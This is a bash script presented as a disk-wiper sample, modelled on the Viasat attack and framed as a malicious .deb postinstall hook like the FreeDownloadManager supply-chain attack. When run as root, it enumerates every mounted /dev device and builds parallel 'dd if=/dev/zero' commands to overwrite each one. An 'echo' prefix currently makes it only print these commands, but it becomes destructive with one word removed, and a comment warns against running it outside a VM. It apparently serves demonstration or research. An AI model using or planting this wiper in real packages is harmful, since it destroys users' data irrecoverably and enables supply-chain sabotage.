#!/bin/bash
# Wipes all locally mounted disks, similar to Viasat attack [2022]
#
# Example deployment: .deb (apt package) postinstall,
# similar to the FreeDownloadManager attack [2021]
#
# FOR THE LOVE OF GOD DO NOT RUN THIS OUTSIDE OF A VM
if [[ "${UID}" == 0 ]]; then
   # Wipe disks in parallel for fastest performance
   grep -E "^/dev" /proc/mounts \
     | cut -d" " -f1 \
     | sort -u \
     | xargs -P8 -I{} echo sudo dd if=/dev/zero of={}
else
   echo "Have a great day!"
fi
